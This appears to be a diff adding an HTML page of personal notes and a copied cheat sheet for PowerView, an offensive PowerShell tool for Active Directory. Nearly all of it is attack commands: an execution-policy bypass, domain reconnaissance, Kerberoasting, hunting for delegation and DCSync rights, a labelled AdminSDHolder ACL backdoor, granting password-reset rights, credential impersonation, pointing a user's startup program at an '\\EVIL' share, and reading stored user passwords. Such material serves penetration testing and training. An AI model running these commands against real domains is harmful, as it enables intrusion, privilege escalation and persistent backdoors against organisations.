@@ -1,0 +1,251 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>powerview</title>
+</head><body>powershell -ep bypass<br/>
+<br/>
+<b>. .\PowerView.ps1</b><br/>
+<br/>
+<br/>
+Get-NetDomainController<br/>
+<br/>
+Get-DomainPolicy<br/>
+<br/>
+(Get-DomainPolicy)."system access"<br/>
+<br/>
+Get-NetUser | select cn <br/>
+Get-NetUser | select description<br/>
+Get-UserProperty<br/>
+Get-UserProperty -Properties pwdlastset<br/>
+<br/>
+<b># check the honey pot</b><br/>
+Get-UserProperty -Properties logoncount<br/>
+<br/>
+<br/>
+Get-UserProperty -Properties badpwdcount<br/>
+<br/>
+Get-NetComputer<br/>
+Get-NetComputer -Fulldata |select OperationSystem<br/>
+<br/>
+<br/>
+# check all shares<br/>
+Invoke-ShareFinder<br/>
+<br/>
+<br/>
+# get Group Policy Object<br/>
+Get-NetGPO | select displayname, whenchanged<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<b>CheatSheet</b><br/>
+<br/>
+<br/>
+# PowerView's last major overhaul is detailed here: http://www.harmj0y.net/blog/powershell/make-powerview-great-again/<br/>
+# &nbsp; tricks for the 'old' PowerView are at https://gist.github.com/HarmJ0y/3328d954607d71362e3c<br/>
+<br/>
+# the most up-to-date version of PowerView will always be in the dev branch of PowerSploit:<br/>
+# &nbsp; https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1<br/>
+<br/>
+# New function naming schema:<br/>
+# &nbsp; Verbs:<br/>
+# &nbsp; &nbsp; &nbsp; Get : retrieve full raw data sets<br/>
+# &nbsp; &nbsp; &nbsp; Find : ‘find’ specific data entries in a data set<br/>
+# &nbsp; &nbsp; &nbsp; Add : add a new object to a destination<br/>
+# &nbsp; &nbsp; &nbsp; Set : modify a given object<br/>
+# &nbsp; &nbsp; &nbsp; Invoke : lazy catch-all<br/>
+# &nbsp; Nouns:<br/>
+# &nbsp; &nbsp; &nbsp; Verb-Domain* : indicates that LDAP/.NET querying methods are being executed<br/>
+# &nbsp; &nbsp; &nbsp; Verb-WMI* : indicates that WMI is being used under the hood to execute enumeration<br/>
+# &nbsp; &nbsp; &nbsp; Verb-Net* : indicates that Win32 API access is being used under the hood<br/>
+<br/>
+<br/>
+# get all the groups a user is effectively a member of, 'recursing up' using tokenGroups<br/>
+Get-DomainGroup -MemberIdentity &lt;User/Group&gt;<br/>
+<br/>
+# get all the effective members of a group, 'recursing down'<br/>
+Get-DomainGroupMember -Identity "Domain Admins" -Recurse<br/>
+<br/>
+# use an alterate creadential for any function<br/>
+$SecPassword = ConvertTo-SecureString 'BurgerBurgerBurger!' -AsPlainText -Force<br/>
+$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)<br/>
+Get-DomainUser -Credential $Cred<br/>
+<br/>
+# retrieve all the computer dns host names a GPP password applies to<br/>
+Get-DomainOU -GPLink '&lt;GPP_GUID&gt;' | % {Get-DomainComputer -SearchBase $_.distinguishedname -Properties dnshostname}<br/>
+<br/>
+# get all users with passwords changed &gt; 1 year ago, returning sam account names and password last set times<br/>
+$Date = (Get-Date).AddYears(-1).ToFileTime()<br/>
+Get-DomainUser -LDAPFilter "(pwdlastset&lt;=$Date)" -Properties samaccountname,pwdlastset<br/>
+<br/>
+# all enabled users, returning distinguishednames<br/>
+Get-DomainUser -LDAPFilter "(!userAccountControl:1.2.840.113556.1.4.803:=2)" -Properties distinguishedname<br/>
+Get-DomainUser -UACFilter NOT_ACCOUNTDISABLE -Properties distinguishedname<br/>
+<br/>
+# all disabled users<br/>
+Get-DomainUser -LDAPFilter "(userAccountControl:1.2.840.113556.1.4.803:=2)"<br/>
+Get-DomainUser -UACFilter ACCOUNTDISABLE<br/>
+<br/>
+# all users that require smart card authentication<br/>
+Get-DomainUser -LDAPFilter "(useraccountcontrol:1.2.840.113556.1.4.803:=262144)"<br/>
+Get-DomainUser -UACFilter SMARTCARD_REQUIRED<br/>
+<br/>
+# all users that *don't* require smart card authentication, only returning sam account names<br/>
+Get-DomainUser -LDAPFilter "(!useraccountcontrol:1.2.840.113556.1.4.803:=262144)" -Properties samaccountname<br/>
+Get-DomainUser -UACFilter NOT_SMARTCARD_REQUIRED -Properties samaccountname<br/>
+<br/>
+# use multiple identity types for any *-Domain* function<br/>
+'S-1-5-21-890171859-3433809279-3366196753-1114', 'CN=dfm,CN=Users,DC=testlab,DC=local','4c435dd7-dc58-4b14-9a5e-1fdb0e80d201','administrator' | Get-DomainUser -Properties samaccountname,lastlogoff<br/>
+<br/>
+# find all users with an SPN set (likely service accounts)<br/>
+Get-DomainUser -SPN<br/>
+<br/>
+# check for users who don't have kerberos preauthentication set<br/>
+Get-DomainUser -PreauthNotRequired<br/>
+Get-DomainUser -UACFilter DONT_REQ_PREAUTH<br/>
+<br/>
+# find all service accounts in "Domain Admins"<br/>
+Get-DomainUser -SPN | ?{$_.memberof -match 'Domain Admins'}<br/>
+<br/>
+# find users with sidHistory set<br/>
+Get-DomainUser -LDAPFilter '(sidHistory=*)'<br/>
+<br/>
+# find any users/computers with constrained delegation st<br/>
+Get-DomainUser -TrustedToAuth<br/>
+Get-DomainComputer -TrustedToAuth<br/>
+<br/>
+# enumerate all servers that allow unconstrained delegation, and all privileged users that aren't marked as sensitive/not for delegation<br/>
+$Computers = Get-DomainComputer -Unconstrained<br/>
+$Users = Get-DomainUser -AllowDelegation -AdminCount<br/>
+<br/>
+# return the local *groups* of a remote server<br/>
+Get-NetLocalGroup SERVER.domain.local<br/>
+<br/>
+# return the local group *members* of a remote server using Win32 API methods (faster but less info)<br/>
+Get-NetLocalGroupMember -Method API -ComputerName SERVER.domain.local<br/>
+<br/>
+# Kerberoast any users in a particular OU with SPNs set<br/>
+Invoke-Kerberoast -SearchBase "LDAP://OU=secret,DC=testlab,DC=local"<br/>
+<br/>
+# Find-DomainUserLocation == old Invoke-UserHunter<br/>
+# enumerate servers that allow unconstrained Kerberos delegation and show all users logged in<br/>
+Find-DomainUserLocation -ComputerUnconstrained -ShowAll<br/>
+<br/>
+# hunt for admin users that allow delegation, logged into servers that allow unconstrained delegation<br/>
+Find-DomainUserLocation -ComputerUnconstrained -UserAdminCount -UserAllowDelegation<br/>
+<br/>
+# find all computers in a given OU<br/>
+Get-DomainComputer -SearchBase "ldap://OU=..."<br/>
+<br/>
+# Get the logged on users for all machines in any *server* OU in a particular domain<br/>
+Get-DomainOU -Identity *server* -Domain &lt;domain&gt; | %{Get-DomainComputer -SearchBase $_.distinguishedname -Properties dnshostname | %{Get-NetLoggedOn -ComputerName $_}}<br/>
+<br/>
+# enumerate all gobal catalogs in the forest<br/>
+Get-ForestGlobalCatalog<br/>
+<br/>
+# turn a list of computer short names to FQDNs, using a global catalog<br/>
+gc computers.txt | % {Get-DomainComputer -SearchBase "GC://GLOBAL.CATALOG" -LDAP "(name=$_)" -Properties dnshostname}<br/>
+<br/>
+# enumerate the current domain controller policy<br/>
+$DCPolicy = Get-DomainPolicy -Policy DC<br/>
+$DCPolicy.PrivilegeRights # user privilege rights on the dc...<br/>
+<br/>
+# enumerate the current domain policy<br/>
+$DomainPolicy = Get-DomainPolicy -Policy Domain<br/>
+$DomainPolicy.KerberosPolicy # useful for golden tickets ;)<br/>
+$DomainPolicy.SystemAccess # password age/etc.<br/>
+<br/>
+# enumerate what machines that a particular user/group identity has local admin rights to<br/>
+# &nbsp; Get-DomainGPOUserLocalGroupMapping == old Find-GPOLocation<br/>
+Get-DomainGPOUserLocalGroupMapping -Identity &lt;User/Group&gt;<br/>
+<br/>
+# enumerate what machines that a given user in the specified domain has RDP access rights to<br/>
+Get-DomainGPOUserLocalGroupMapping -Identity &lt;USER&gt; -Domain &lt;DOMAIN&gt; -LocalGroup RDP<br/>
+<br/>
+# export a csv of all GPO mappings<br/>
+Get-DomainGPOUserLocalGroupMapping | %{$_.computers = $_.computers -join ", "; $_} | Export-CSV -NoTypeInformation gpo_map.csv<br/>
+<br/>
+# use alternate credentials for searching for files on the domain<br/>
+# &nbsp; Find-InterestingDomainShareFile == old Invoke-FileFinder<br/>
+$Password = "PASSWORD" | ConvertTo-SecureString -AsPlainText -Force<br/>
+$Credential = New-Object System.Management.Automation.PSCredential("DOMAIN\user",$Password)<br/>
+Find-InterestingDomainShareFile -Domain DOMAIN -Credential $Credential<br/>
+<br/>
+# enumerate who has rights to the 'matt' user in 'testlab.local', resolving rights GUIDs to names<br/>
+Get-DomainObjectAcl -Identity matt -ResolveGUIDs -Domain testlab.local<br/>
+<br/>
+# grant user 'will' the rights to change 'matt's password<br/>
+Add-DomainObjectAcl -TargetIdentity matt -PrincipalIdentity will -Rights ResetPassword -Verbose<br/>
+<br/>
+# audit the permissions of AdminSDHolder, resolving GUIDs<br/>
+Get-DomainObjectAcl -SearchBase 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -ResolveGUIDs<br/>
+<br/>
+# backdoor the ACLs of all privileged accounts with the 'matt' account through AdminSDHolder abuse<br/>
+Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All<br/>
+<br/>
+# retrieve *most* users who can perform DC replication for dev.testlab.local (i.e. DCsync)<br/>
+Get-DomainObjectAcl "dc=dev,dc=testlab,dc=local" -ResolveGUIDs | ? {<br/>
+&nbsp; &nbsp; ($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')<br/>
+}<br/>
+<br/>
+# find linked DA accounts using name correlation<br/>
+Get-DomainGroupMember 'Domain Admins' | %{Get-DomainUser $_.membername -LDAPFilter '(displayname=*)'} | %{$a=$_.displayname.split(' ')[0..1] -join ' '; Get-DomainUser -LDAPFilter "(displayname=*$a*)" -Properties displayname,samaccountname}<br/>
+<br/>
+# save a PowerView object to disk for later usage<br/>
+Get-DomainUser | Export-Clixml user.xml<br/>
+$Users = Import-Clixml user.xml<br/>
+<br/>
+# Find any machine accounts in privileged groups<br/>
+Get-DomainGroup -AdminCount | Get-DomainGroupMember -Recurse | ?{$_.MemberName -like '*$'}<br/>
+<br/>
+# Enumerate permissions for GPOs where users with RIDs of &gt; -1000 have some kind of modification/control rights<br/>
+Get-DomainObjectAcl -LDAPFilter '(objectCategory=groupPolicyContainer)' | ? { ($_.SecurityIdentifier -match '^S-1-5-.*-[1-9]\d{3,}$') -and ($_.ActiveDirectoryRights -match 'WriteProperty|GenericAll|GenericWrite|WriteDacl|WriteOwner')}<br/>
+<br/>
+# find all policies applied to a current machine<br/>
+Get-DomainGPO -ComputerIdentity windows1.testlab.local<br/>
+<br/>
+# enumerate all groups in a domain that don't have a global scope, returning just group names<br/>
+Get-DomainGroup -GroupScope NotGlobal -Properties name<br/>
+<br/>
+# enumerate all foreign users in the global catalog, and query the specified domain localgroups for their memberships<br/>
+# &nbsp; query the global catalog for foreign security principals with domain-based SIDs, and extract out all distinguishednames<br/>
+$ForeignUsers = Get-DomainObject -Properties objectsid,distinguishedname -SearchBase "GC://testlab.local" -LDAPFilter '(objectclass=foreignSecurityPrincipal)' | ? {$_.objectsid -match '^S-1-5-.*-[1-9]\d{2,}$'} | Select-Object -ExpandProperty distinguishedname<br/>
+$Domains = @{}<br/>
+$ForeignMemberships = ForEach($ForeignUser in $ForeignUsers) {<br/>
+&nbsp; &nbsp; # extract the domain the foreign user was added to<br/>
+&nbsp; &nbsp; $ForeignUserDomain = $ForeignUser.SubString($ForeignUser.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'<br/>
+&nbsp; &nbsp; # check if we've already enumerated this domain<br/>
+&nbsp; &nbsp; if (-not $Domains[$ForeignUserDomain]) {<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; $Domains[$ForeignUserDomain] = $True<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; # enumerate all domain local groups from the given domain that have membership set with our foreignSecurityPrincipal set<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; $Filter = "(|(member=" + $($ForeignUsers -join ")(member=") + "))"<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; Get-DomainGroup -Domain $ForeignUserDomain -Scope DomainLocal -LDAPFilter $Filter -Properties distinguishedname,member<br/>
+&nbsp; &nbsp; }<br/>
+}<br/>
+$ForeignMemberships | fl<br/>
+<br/>
+# if running in -sta mode, impersonate another credential a la "runas /netonly"<br/>
+$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force<br/>
+$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)<br/>
+Invoke-UserImpersonation -Credential $Cred<br/>
+# ... action<br/>
+Invoke-RevertToSelf<br/>
+<br/>
+# enumerates computers in the current domain with 'outlier' properties, i.e. properties not set from the firest result returned by Get-DomainComputer<br/>
+Get-DomainComputer -FindOne | Find-DomainObjectPropertyOutlier<br/>
+<br/>
+# set the specified property for the given user identity<br/>
+Set-DomainObject testuser -Set @{'mstsinitialprogram'='\\EVIL\program.exe'} -Verbose<br/>
+<br/>
+# Set the owner of 'dfm' in the current domain to 'harmj0y'<br/>
+Set-DomainObjectOwner -Identity dfm -OwnerIdentity harmj0y<br/>
+<br/>
+# retrieve *most* users who can perform DC replication for dev.testlab.local (i.e. DCsync)<br/>
+Get-ObjectACL "DC=testlab,DC=local" -ResolveGUIDs | ? {<br/>
+&nbsp; &nbsp; ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ObjectAceType -match 'Replication-Get')<br/>
+}<br/>
+<br/>
+# check if any user passwords are set<br/>
+$FormatEnumerationLimit=-1;Get-DomainUser -LDAPFilter '(userPassword=*)' -Properties samaccountname,memberof,userPassword | % {Add-Member -InputObject $_ NoteProperty 'Password' "$([System.Text.Encoding]::ASCII.GetString($_.userPassword))" -PassThru} | fl</body></html>
